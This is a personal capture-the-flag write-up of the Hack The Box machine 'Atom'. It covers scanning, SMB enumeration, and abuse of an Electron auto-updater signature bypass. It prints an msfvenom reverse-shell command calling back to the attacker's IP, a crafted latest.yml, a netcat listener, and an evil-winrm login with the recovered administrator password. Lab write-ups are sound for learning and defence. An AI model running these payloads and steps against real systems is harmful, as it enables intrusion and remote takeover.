Box Name: Atom
IP Address: 10.10.10.237
OS: Windows
Difficulty: Medium
Date: August 15, 2021

Workgroup: WORKGROUP

## Initial scan results:
```
Nmap 7.91 scan initiated Sun Aug 15 14:19:00 2021 as: nmap -v -oA nmap/init -A -T5 10.10.10.237
Nmap scan report for 10.10.10.237
Host is up (0.033s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp open  msrpc        Microsoft Windows RPC
443/tcp open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
|_SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h25m52s, deviation: 4h02m30s, median: 5m51s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-08-15T11:25:23-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-15T18:25:24
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   28.65 ms 10.10.14.1
2   28.79 ms 10.10.10.237

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sun Aug 15 14:20:09 2021 -- 1 IP address (1 host up) scanned in 69.40 seconds
```

So we're looking at a windows machine running PHP and Apache.  The webpage loads up with an option to downlaod a zip file which contains a .exe file, and we can explore that more later 

## SAMBA

Using smbclient.py, we see a Software_Updates share containing a UAT testing procedures PDF.  Reading this PDF it mentions that we have an electron app and the server "auto-executes" QA based on the presence of a file in the client folders.

Let's see if we can decompile the electron app... https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37 for reference

## ASAR

First we extract the .zip from the releases directory to get an exe. This we rename to .zip and extract again to reveal app-64.7z which again we extract.  This gives us a resources directory which contains the .asar file, so now we do the following:

```
npm install -g asar
cd /path/to/resources/
mkdir source
asar extract app.asar source
```

Note that if you extract the electron.asar on accident, you'll have a bad time.  Extracting the app.asar file reveals a main.js file which I assume we can play with...

## Backdooring main.js

My first attempt was to put an XMLHttpRequest into the "ready" event of main.js -- I then proceeded to re-pack the ASAR and walk back through the process of zipping, zipping, and uploading.  I got excited when I saw my file disappear from `client1` in the SMB share, but unfortunately I didn't get the HTTP request that I was expecting.

I'm thinking I either re-packed the executable incorrectly, or I did something else wrong.

## Consulting the Writeup

Looks like the correct path forward is close.  What I missed are three things: 1. the app relies on an auto-updater 2. the auto-updater is vulnerable and 3. I should have a windows VM handy for this kind of stuff.

## Booting the Windows VM and playing with the Auto Updater

I've copied the electron app to my windows VM (and lowered the ram on the VM so I can run it alongside Kali), and running the app we see "Error connecting to update server" (or similar, I forget exactly and it's gone now.)

If we inspect it with wireshark, what we see is a DNS request to (among other domains that are owned by Microsoft or similar) "updates.atom.htb".  If we inspect the source for the application, we can see it's using Electron Auto-Updater.  
Specifically, it's using Electron Auto-Updater version 2.23.3 which, according to https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html is vulnerable to signature bypass.  This is likely what we did wrong earlier -- apparently there's a signature on the executable.

Also, the updater can download files from URLs according to https://www.electron.build/configuration/publish#genericserveroptions 

### Making the Payload

So there's a couple ways we can do this.  

1. We can alter the electron app's JS code to pull down some files and then exec them on the remote server
2. We can create our own custom .exe using something like .NET and compile it and let the remote server pull it down
3. We can use MSF Venom to create a malicious payload easy-peasy in one line and push that.

I'm going to try the MSF Venom route because a) I'm short on time, b) I've never done it before and c) I don't have a good reason not to.  

A good reason not to would be something like needing to practice my .NET scripting, needing to not use MSF for some reason (OSCP?), or needing to bypass AV (MSF Venom is likely highly detectable).


```
# So to create the MSF payload we run:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe > shell.exe

# Then th trigger the exploit we need a quote in the filename (lol)
mv shell.exe "sh'ell.exe"

# and we're going to need the correct hash for the latest.yml file
sha512sum "sh'ell.exe" | cut-d ' ' -f 1 | xxd -r -p | base64 -w0
```

`sha512sum` produces the ascii sha512 checksum, then we cut it out of the output (delimiter ' ', field 1).  We then take the ascii hash, convert it to binary (-r flag to xxd), print out the raw characters (-p flag to xxd), and base64 encode that output (-w0 prevents linewrapping)

```
# This gives me:
cRqUc3teerBYx5hesYN04DykS0GWGZZCOk/Kc5OuBcki7cyvucUavSD4Fd4mFwbZXXhQrDaYv68quUUnkp6dmQ==  
```

Your hash will likely differ, if you try this.

Now we put it all into the latest.yml:

```
version: 1.0.1
files: 
  - url: sh'ell.exe
    sha512: cRqUc3teerBYx5hesYN04DykS0GWGZZCOk/Kc5OuBcki7cyvucUavSD4Fd4mFwbZXXhQrDaYv68quUUnkp6dmQ==
    size: 7168
path: sh'ell.exe
sha512: cRqUc3teerBYx5hesYN04DykS0GWGZZCOk/Kc5OuBcki7cyvucUavSD4Fd4mFwbZXXhQrDaYv68quUUnkp6dmQ==
```

### Delivering the payload

For this, we simply setup a listener:
```
nc -nlvp 4444
```

And then upload the file to any of the folders on the SMB share:
```
└─$ smbclient.py 'WORKGROUP@10.10.10.237'                                                                      130 ⨯
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

Password:
Type help for list of commands
# shares
use ADMIN$
C$
IPC$
Software_Updates
# use Software_Updates
# ls
drw-rw-rw-          0  Sun Aug 15 19:04:39 2021 .
drw-rw-rw-          0  Sun Aug 15 19:04:39 2021 ..
drw-rw-rw-          0  Sun Aug 15 19:04:39 2021 client1
drw-rw-rw-          0  Sun Aug 15 19:04:39 2021 client2
drw-rw-rw-          0  Sun Aug 15 19:04:39 2021 client3
-rw-rw-rw-      35202  Fri Apr  9 07:18:08 2021 UAT_Testing_Procedures.pdf
# cd client1
# put sh\'ell.exe
[-] [Errno 2] No such file or directory: "sh\\'ell.exe"
# put sh'ell.exe
# put latest.yml
# ls
drw-rw-rw-          0  Sun Aug 15 19:06:52 2021 .
drw-rw-rw-          0  Sun Aug 15 19:06:52 2021 ..
-rw-rw-rw-        273  Sun Aug 15 19:06:52 2021 latest.yml
-rw-rw-rw-       7168  Sun Aug 15 19:06:49 2021 sh'ell.exe
```

And after a few minutes, you'll see that the files you uploaded are gone and you should get a shell in yout netcat listener

```
└─$ nc -nlvp 4444      
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.237] 50738
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

The flag is on the desktop.

### Privilege Escalation

For this, I'm going to give us the short version since I'm at this point shamelessly using the official walkthrough.

TLDR:
1. You enumerate the directories in the uer's home folder and you find "PortableKanban" which has a vulnerability allowing you to decrypt the encrypted stored password.  If only you had the encrypted password... the file that the vulnerability mentions isn't there.
2. You download and install PortableKanban from the internet, run it, and find that it also suports redis.
3. There's redis running on the box, but when you connect it needs a password.  Luckily, the password is stored on the server in plain text in the Proram Files / Redis folder
4. Using the password to connect to redis, you issue the `keys` command, note that there is a key for a specific user, and then you `get` the value at that key.  This gives you the encrypted password.
5. You can now decrypt the password using the logic in the exploit
6. With the administrator's password, you can use `evil-winrm` to connect to the box and get a root shell

```
evil-winrm -i 10.10.10.237 -u administrator -p kidvscat_admin_@123
```

Done

## Summary

I fit this box into four hours on a weekend, three of which I had a partner.  He got a shell without the walkthough and was well on his way to root at the end of our time.  I went down a different path and got stuck.

Lessons learned:
1. Always check for CVEs on all dependencies and software versions
2. Always enumerate the home folder
3. Always try to connect to services (like redis) without passwords
4. Remember to check SMB shares
5. Electron apps can be disassembled, but that doesn't necessarily mean you have to backdoor them.  Sometimes the source can reveal other vulnerabilities.
6. Privilege Escalation may require a combination of steps to find an encrypted password somewhere on the box, decrypt it, and use it to try and login.
7. WinRM can give you a shell if you have a username and password -- use the ruby gem for `evil-winrm`

